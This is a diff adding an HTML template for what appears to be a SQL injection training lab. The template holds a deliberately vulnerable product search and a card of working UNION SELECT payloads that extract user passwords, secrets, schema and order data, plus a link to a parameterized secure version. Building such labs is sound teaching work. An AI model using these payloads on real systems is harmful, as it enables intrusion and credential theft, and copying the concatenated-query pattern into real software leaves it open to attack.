@@ -1,0 +1,94 @@
+{% extends "base.html" %}
+
+{% block title %}Search - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">🔍 Product Search</span>
+        <span class="badge badge-danger">Vulnerable: Union-Based SQLi</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This search is vulnerable to <strong>Union-Based SQL Injection</strong>.
+        The search term is directly concatenated into a SELECT query, allowing UNION attacks to extract data from other tables.
+    </p>
+    <form method="GET" action="{{ url_for('search') }}">
+        <div style="display: flex; gap: 12px;">
+            <input type="text" name="q" value="{{ query }}" placeholder="Search products..." style="flex: 1;">
+            <button type="submit" class="btn btn-primary">Search</button>
+        </div>
+    </form>
+    {% if executed_query %}
+    <div class="query-box">
+        <span class="label">Executed SQL Query</span>
+        <code>{{ executed_query }}</code>
+    </div>
+    {% endif %}
+    {% if error %}
+        <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+</div>
+
+{% if results %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">Results ({{ results|length }} found)</span>
+    </div>
+    <table class="data-table">
+        <thead>
+            <tr><th>ID</th><th>Name</th><th>Description</th><th>Price</th><th>Category</th></tr>
+        </thead>
+        <tbody>
+            {% for row in results %}
+            <tr>
+                <td>{{ row[0] }}</td>
+                <td>{{ row[1] }}</td>
+                <td>{{ row[2] }}</td>
+                <td>${{ row[3] }}</td>
+                <td>{{ row[4] }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+{% elif query %}
+<div class="alert alert-info">No results found for "{{ query }}"</div>
+{% endif %}
+
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">💉 Union-Based SQLi Payloads</span>
+        <span class="badge badge-warning">Click to copy</span>
+    </div>
+    <div class="payload">
+        <div class="payload-label">Extract all users (5 columns must match)</div>
+        ' UNION SELECT id, username, password, email, role FROM users --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Extract secrets/flags</div>
+        ' UNION SELECT id, secret_key, secret_value, description, 'secrets' FROM secrets --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Discover database schema</div>
+        ' UNION SELECT null, name, sql, null, type FROM sqlite_master --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Get SQLite version</div>
+        ' UNION SELECT null, sqlite_version(), null, null, null --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Extract orders with user info</div>
+        ' UNION SELECT o.id, u.username, p.name, o.total_price, o.status FROM orders o JOIN users u ON o.user_id=u.id JOIN products p ON o.product_id=p.id --
+    </div>
+</div>
+
+<div class="card" style="border-color: var(--success);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--success);">🛡️ Secure Version</span>
+        <a href="{{ url_for('secure_search') }}" class="btn btn-outline" style="font-size: 12px; padding: 6px 12px;">Try Secure Search →</a>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px;">
+        The secure version uses <code>?</code> parameterized LIKE queries, preventing UNION injection.
+    </p>
+</div>
+{% endblock %}
